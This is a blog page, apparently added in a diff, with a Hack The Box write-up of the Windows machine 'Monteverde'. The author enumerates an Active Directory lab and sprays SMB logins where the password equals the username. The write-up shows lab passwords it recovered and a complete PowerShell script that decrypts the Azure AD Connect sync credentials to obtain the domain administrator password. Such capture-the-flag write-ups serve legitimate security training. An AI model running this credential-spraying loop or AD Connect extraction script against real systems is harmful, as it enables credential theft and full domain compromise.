@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Montevarde Writeup &mdash; fmash16's blog</title>
+<meta property="og:title" content="Hackthebox - Montevarde Writeup" />
+      <meta property="og:description" content="A medium difficulty windows box exploited through ldap and azure." />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="/img/htb_montevarde/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
+      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
+      <p style="text-align:center;font-size:20px">
+        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
+        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
+        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
+      </p>
+    </div>
+	</div>
+
+<article>
+<h1 id="hackthebox---montevarde-writeup">Hackthebox - Montevarde Writeup</h1>
+<div class="figure">
+<img src="/img/htb_montevarde/card.png" />
+
+</div>
+<h2 id="nmap-scan">## Nmap Scan</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">nmap</span> -sC -sV -sS -oN nmap.out 10.10.10.172</code></pre></div>
+<p>Open ports: &gt; PORT STATE SERVICE VERSION<br />
+&gt; 53/tcp open domain?<br />
+&gt; 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time:<br />
+&gt; 2020-05-24 10:34:50Z)<br />
+&gt; 135/tcp open msrpc Microsoft Windows RPC<br />
+&gt; 139/tcp open netbios-ssn Microsoft Windows netbios-ssn<br />
+&gt; 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:<br />
+&gt; MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br />
+&gt; 445/tcp open microsoft-ds?<br />
+&gt; 464/tcp open kpasswd5?<br />
+&gt; 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br />
+&gt; 636/tcp open tcpwrapped<br />
+&gt; 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:<br />
+&gt; MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br />
+&gt; 3269/tcp open tcpwrapped<br />
+&gt; 1 service unrecognized despite returning data. If you know the service/version,<br />
+&gt; please submit the following fingerprint at<br />
+&gt; https://nmap.org/cgi-bin/submit.cgi?new-service :<br />
+&gt; SF-Port53-TCP:V=7.80%I=7%D=5/24%Time=5ECA58C3%P=x86_64-pc-linux-gnu%r(DNSV<br />
+&gt; SF:ersionBindReqTCP,20,&quot;1e0681040107version  &gt; SF:x04bind1003&quot;);<br />
+&gt; Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows<br />
+&gt;<br />
+&gt; Host script results:<br />
+&gt; |<em>clock-skew: -46m45s<br />
+&gt; | smb2-security-mode:<br />
+&gt; | 2.02:<br />
+&gt; |</em> Message signing enabled and required<br />
+&gt; | smb2-time:<br />
+&gt; | date: 2020-05-24T10:37:26<br />
+&gt; |_ start_date: N/A</p>
+<h2 id="enum4linux">enum4linux:</h2>
+<blockquote>
+<p>Domain Name : MEGABANK.LOCAL<br />
+Machine Name : MONTEVARDE</p>
+</blockquote>
+<p>Got some users and groups:</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">Group</span> <span class="st">&#39;Trading&#39;</span> (RID: 2610) <span class="ex">has</span> member: MEGABANK\dgalanos
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\krbtgt
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\AAD_987d7f2f57d2
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\mhope
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\SABatchJobs
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\svc-ata
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\svc-bexec
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\svc-netapp
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\dgalanos
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\roleary
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\smorgan
+<span class="ex">Group</span> <span class="st">&#39;Domain Guests&#39;</span> (RID: 514) <span class="ex">has</span> member: MEGABANK\Guest
+<span class="ex">Group</span> <span class="st">&#39;HelpDesk&#39;</span> (RID: 2611) <span class="ex">has</span> member: MEGABANK\roleary
+<span class="ex">Group</span> <span class="st">&#39;Group Policy Creator Owners&#39;</span> (RID: 520) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Azure Admins&#39;</span> (RID: 2601) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Azure Admins&#39;</span> (RID: 2601) <span class="ex">has</span> member: MEGABANK\AAD_987d7f2f57d2
+<span class="ex">Group</span> <span class="st">&#39;Azure Admins&#39;</span> (RID: 2601) <span class="ex">has</span> member: MEGABANK\mhope</code></pre></div>
+<p>What is interesting is the group azure admins and its member mhope</p>
+<h2 id="ldapsearch">ldapsearch</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ldapsearch</span> -x -h 10.10.10.172 -s base namingcontext
+<span class="ex">ldapsearch</span> -x -h 10.10.10.172 -s base</code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/1.png" />
+
+</div>
+<p>We find:</p>
+<blockquote>
+<p>namingContexts: DC=MEGABANK,DC=LOCAL</p>
+</blockquote>
+<p>Now we can enumerate using ldapsearch</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ldapsearch</span> -x -b <span class="st">&quot;dc=megabank,dc=local&quot;</span> -h 10.10.10.172 -s sub</code></pre></div>
+<h2 id="rpcclient">rpcclient</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpcclient</span> -U <span class="st">&#39;&#39;</span> 10.10.10.172</code></pre></div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomusers</code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/2.png" />
+
+</div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomgroups</code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/3.png" />
+
+</div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpclient</span> $<span class="op">&gt;</span> querygroupmem 0xa29</code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/4.png" />
+
+</div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpcclient</span> $<span class="op">&gt;</span> queryuser 0x641</code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/5.png" />
+
+</div>
+<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
+<h2 id="smbclient-bruteforce">smbclient bruteforce</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">while</span> <span class="bu">read</span> <span class="va">USER</span>; <span class="kw">do</span> <span class="bu">echo</span> <span class="va">$USER</span> <span class="kw">&amp;&amp;</span> <span class="ex">smbclient</span> -L <span class="dt">\\\\</span>10.10.10.172 -U <span class="va">$USER</span>%<span class="va">$USER</span><span class="kw">;</span> <span class="kw">done</span> <span class="op">&lt;</span> <span class="ex">users.txt</span></code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/6.png" />
+
+</div>
+<p>We see an intersting share users$. We mount the share using smbclient and have a look.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.172<span class="dt">\\</span>users$ -U SABatchJobs%SABatchJobs</code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/7.png" />
+
+</div>
+<p>In the direcotory of user mhope, we find an interesting file <strong>azure.xml</strong>, we download it to our local machine usign <strong>get</strong></p>
+<div class="figure">
+<img src="/img/htb_montevarde/8.png" />
+
+</div>
+<h2 id="azure.xml">azure.xml</h2>
+<p>Having a look at the file, we get</p>
+<div class="sourceCode"><pre class="sourceCode xml"><code class="sourceCode xml"><span class="kw">&lt;Objs</span><span class="ot"> Version=</span><span class="st">&quot;1.1.0.1&quot;</span><span class="ot"> xmlns=</span><span class="st">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;Obj</span><span class="ot"> RefId=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span>
+    <span class="kw">&lt;TN</span><span class="ot"> RefId=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span>
+      <span class="kw">&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="kw">&lt;/T&gt;</span>
+      <span class="kw">&lt;T&gt;</span>System.Object<span class="kw">&lt;/T&gt;</span>
+    <span class="kw">&lt;/TN&gt;</span>
+    <span class="kw">&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="kw">&lt;/ToString&gt;</span>
+    <span class="kw">&lt;Props&gt;</span>
+      <span class="kw">&lt;DT</span><span class="ot"> N=</span><span class="st">&quot;StartDate&quot;</span><span class="kw">&gt;</span>2020-01-03T05:35:00.7562298-08:00<span class="kw">&lt;/DT&gt;</span>
+      <span class="kw">&lt;DT</span><span class="ot"> N=</span><span class="st">&quot;EndDate&quot;</span><span class="kw">&gt;</span>2054-01-03T05:35:00.7562298-08:00<span class="kw">&lt;/DT&gt;</span>
+      <span class="kw">&lt;G</span><span class="ot"> N=</span><span class="st">&quot;KeyId&quot;</span><span class="kw">&gt;</span>00000000-0000-0000-0000-000000000000<span class="kw">&lt;/G&gt;</span>
+      <span class="kw">&lt;S</span><span class="ot"> N=</span><span class="st">&quot;Password&quot;</span><span class="kw">&gt;</span>4n0therD4y@n0th3r$<span class="kw">&lt;/S&gt;</span>
+    <span class="kw">&lt;/Props&gt;</span>
+  <span class="kw">&lt;/Obj&gt;</span>
+<span class="kw">&lt;/Objs&gt;</span></code></pre></div>
+<p>Here we get a password. Since the file was in the directory of user mhope, it should be the password for mhope</p>
+<p>Creds found:</p>
+<blockquote>
+<p>User: mhope<br />
+Password: 4n0therD4y@n0th3r$</p>
+</blockquote>
+<h2 id="evil-winrm-shell">Evil-winrm shell</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">evil-winrm</span> -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$</code></pre></div>
+<p>And we get a shell. We also get our required user.txt file.</p>
+<div class="figure">
+<img src="/img/htb_montevarde/9.png" />
+
+</div>
+<h1 id="privilege-escalation---administrator">Privilege Escalation - Administrator</h1>
+<h2 id="azure-ad-connect-exploit">Azure AD Connect Exploit</h2>
+<p>Previously, we found that our user mhope is a member of the group &quot;Azure Admins&quot;. Microsoft Azure is a cloud computing service created by Microsoft for building, testing, deploying, and managing applications and services through Microsoft-managed data centers.</p>
+<p>We search for some azure vulnerabilites. We find an azure AD connect exploit <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">here.</a>. The same vulnerability is also found <a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">here.</a>.</p>
+<p>Azure AD has a feature called &quot;Password Hash Synchronization&quot;. With Password Hash Synchronization (PHS), the passwords from on-premise AD are actually sent to the cloud, similar to how domain controllers synchronize passwords between each other via replication. This is done from a service account that is created with the installation of AD Connect. So, using this feature, we can perform a <strong>DCsunc</strong> attack. Read more on this type of attacks <a href="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync">here.</a></p>
+<p>So here, the vulnerability allows us to access the DC database containing creds and decrypt it (performing a <strong>DCsync</strong>). We get the powershell script (here.)[https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1] We change the script according to our needs as follows</p>
+<pre class="powershell"><code>    Write-Host &quot;AD Connect Sync Credential Extract POC (@_xpn_)`n&quot;
+
+[-] $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;
+[+] $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=localhost; Initial Catalog=ADSync; Trusted_Connection=True&quot;
+
+    $client.Open()
+    $cmd = $client.CreateCommand()
+    $cmd.CommandText = &quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;
+    $reader = $cmd.ExecuteReader()
+    $reader.Read() | Out-Null
+    $key_id = $reader.GetInt32(0)
+    $instance_id = $reader.GetGuid(1)
+    $entropy = $reader.GetGuid(2)
+    $reader.Close()
+
+    $cmd = $client.CreateCommand()
+    $cmd.CommandText = &quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&quot;
+    $reader = $cmd.ExecuteReader()
+    $reader.Read() | Out-Null
+    $config = $reader.GetString(0)
+    $crypted = $reader.GetString(1)
+    $reader.Close()
+
+    add-type -path &#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;
+    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+    $km.LoadKeySet($entropy, $instance_id, $key_id)
+    $key = $null
+    $km.GetActiveCredentialKey([ref]$key)
+    $key2 = $null
+    $km.GetKey(1, [ref]$key2)
+    $decrypted = $null
+    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+    $domain = select-xml -Content $config -XPath &quot;//parameter[@name=&#39;forest-login-domain&#39;]&quot; | select @{Name = &#39;Domain&#39;;
+    Expression = {$_.node.InnerXML}}
+    $username = select-xml -Content $config -XPath &quot;//parameter[@name=&#39;forest-login-user&#39;]&quot; | select @{Name = &#39;Username&#39;;
+    Expression = {$_.node.InnerXML}}
+    $password = select-xml -Content $decrypted -XPath &quot;//attribute&quot; | select @{Name = &#39;Password&#39;; Expression = {$_.node.InnerText}}
+
+    Write-Host (&quot;Domain: &quot; + $domain.Domain)
+    Write-Host (&quot;Username: &quot; + $username.Username)
+    Write-Host (&quot;Password: &quot; + $password.Password)</code></pre>
+<p>We transfer the script to the target machine and run it to get the administrator creds</p>
+<div class="figure">
+<img src="/img/htb_montevarde/10.png" />
+
+</div>
+<p>Creds found:</p>
+<blockquote>
+<p>User: administrator<br />
+Password: d0m@in4dminyeah!</p>
+</blockquote>
+<h2 id="administrator-shell">Administrator shell</h2>
+<p>We use evilwinrm to get a administrator shell and read our required root.txt.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">evil-winrm</span> -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!</code></pre></div>
+<div class="figure">
+<img src="/img/htb_montevarde/11.png" />
+
+</div>
+<h1 id="resources">Resources:</h1>
+<ul>
+<li>Watch this video for in depth discussion of the azure AD exploit</li>
+</ul>
+<p><a href="http://www.youtube.com/watch?v=JEIR5oGCwdg"><img src="http://img.youtube.com/vi/JEIR5oGCwdg/0.jpg" /></a></p>
+<ul>
+<li>The original founder of the exploit foxit github contains the tools to do the privesc trick <a href="https://github.com/fox-it/adconnectdump" class="uri">https://github.com/fox-it/adconnectdump</a></li>
+</ul>
+<p>PS: the compiled exe files will not work since that uses the local database. But we dont have a database running on our target machine and have to attack the localhost. So we must chnage the source and then compile it to use it.</p>
+</article>
+
+<footer>
+  <p> By fmash16 </p>
+</footer>
+</body>
